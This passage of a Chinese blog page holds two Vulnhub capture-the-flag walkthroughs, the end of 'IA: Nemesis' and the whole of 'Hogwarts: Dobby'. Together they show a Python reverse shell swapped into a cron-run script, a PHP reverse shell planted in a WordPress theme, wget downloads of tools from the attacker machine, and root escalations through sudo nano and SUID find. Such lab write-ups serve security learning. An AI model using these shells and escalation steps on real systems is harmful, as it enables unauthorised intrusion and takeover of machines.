-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/14.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.我们可以在thanos用户目录下发现属于carlos用户的backup.py：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat backup.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/15.png" alt="image-"></p>
-<p>2.通过利用pspy64s工具，可以发现backup.py是被定时调用的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line"></span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，thanos获取pspy64s工具</span><br><span class="line">chmod +x pspy64s</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/16.png" alt="image-"></p>
-<p>3.那我们只需要把原backup.py重命名（因为我们没有修改其内容的权限），重新写入一个backup.py，内容为反弹shell就可以：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mv backup.py backup_original.py</span><br><span class="line">vi backup.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.102&quot;</span>,<span class="number">9002</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span>，kali开启对应端口监听</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/17.png" alt="image-"></p>
-<p>4.可以在carlos用户目录下发现第二个flag，即flag2.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cat flag2.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.同时在carlos用户目录下还能发现root.txt，查看后是让我们去分析encrypt.py文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/19.png" alt="image-"></p>
-<p>2.查看encrypt.py文件后，联系root.txt，通过位置对应我们能知道FUN的密文是QZA，则可写出解密程序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat encrypt.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/20.png" alt="image-"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先确定key为key[89, 65]</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">affine_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([ <span class="built_in">chr</span>((( key[<span class="number">0</span>]*(<span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) + key[<span class="number">1</span>] ) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> text.upper().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>) ])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">      affine_text=<span class="string">&quot;FUN&quot;</span></span><br><span class="line">      <span class="keyword">for</span> key0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">          <span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">              encrypt_text = affine_encrypt(affine_text, [key0, key1])</span><br><span class="line">              <span class="keyword">if</span> encrypt_text == <span class="string">&quot;QZA&quot;</span>:</span><br><span class="line">                  <span class="built_in">print</span>(key0,key1)</span><br><span class="line">                  sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密程序，得到password为ENCRYPTIONISFUNPASSWORD</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">affine_decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">  text = []</span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> cipher:</span><br><span class="line">      b = <span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">          result = (<span class="number">65</span> + x*<span class="number">89</span> - b) % <span class="number">26</span></span><br><span class="line">          <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">              text.append(<span class="built_in">chr</span>(x + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(text))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">  affine_encrypted_text = <span class="string">&quot;FAJSRWOXLAXDQZAWNDDVLSU&quot;</span></span><br><span class="line">  affine_decrypt(affine_encrypted_text)</span><br></pre></td></tr></table></figure>
-
-<p>3.再进行文件权限查看，发现可以使用nano进行提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/21.png" alt="image-"></p>
-<p>4.在gtfobins上查询nano提权方式，成功提权到root：</p>
-<p><img src="/2022/08/15/IA-Nemesis/22.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su carlos，在thanos用户下登录到carlos，password是ENCRYPTIONISFUNPASSWORD</span><br><span class="line">sudo -u root /bin/nano /opt/priv</span><br><span class="line">ctrl+r,ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/23.png" alt="image-"></p>
-<p>5.在&#x2F;root目录下可以发现第三个flag，即root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/24.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/IA/" rel="tag">IA</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Hogwarts-Dobby/">
-                Hogwarts Dobby
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hogwarts-dobby">HOGWARTS: DOBBY</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hogwarts-dobby">名称：Hogwarts: Dobby</span></h4><h4><span id="发布日期2020118">发布日期：2020.11.8</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;proof.txt </p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名dobbyova">文件名：dobby.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsdobbyova">下载地址：</span></h4><h4><span id="md5-11b9fd40b70344a71b432a608ee640ab">MD5: 11B9FD40B70344A71B432A608EE640AB</span></h4><h4><span id="sha1-68110b92fd58d6a4c8f0cdbe169e29259ac797a6">SHA1: 68110B92FD58D6A4C8F0CDBE169E29259AC797A6</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机dobby和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了80端口，访问主页，还是apache的默认页，但源码有路径提示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.126 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/4.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，&#x2F;log目录值得关注一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.126 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="网页发现">网页发现</span></h3><blockquote>
-<p>1.访问&#x2F;alohomora目录，发现Draco用户的密码提示：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/7.png" alt="image-"></p>
-<p>2.访问&#x2F;log目录，发现直接提示了一个密码和路径：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/8.png" alt="image-"></p>
-<p>3.继续访问&#x2F;DiagonAlley，发现一串brainfuck编码，且这个页面是用wordpress搭建的：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/9.png" alt="image-"></p>
-<p>4.将brainfuck字串解码，但解出来是乱码：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/10.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台登录写入shell">Wordpress后台登录，写入shell</span></h3><blockquote>
-<p>1.再从wordpress入手，用wpscan进行扫描，但没有过多问题：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.126/DiagonAlley --detection-mode aggressive</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/11.png" alt="image-"></p>
-<p>2.进入wp-login.php后台页，我们有用户draco，而提示他的马的名字slytherin就是密码：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/12.png" alt="image-"></p>
-<p>3.进入wordpress后台后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行ip及端口修改，在Apariencia-Editor de temas-Error 404页写入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/13.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/14.png" alt="image-"></p>
-<p>4.在kali开启对应端口监听，访问&#x2F;DiagonAlley目录下不存在页即可触发shell，再利用python构建交互式shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/15.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.查找有suid的文件，发现find：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null | grep usr/bin</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/17.png" alt="image-"></p>
-<p>2.利用find可以直接提权到root：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">vi proof.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/19.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
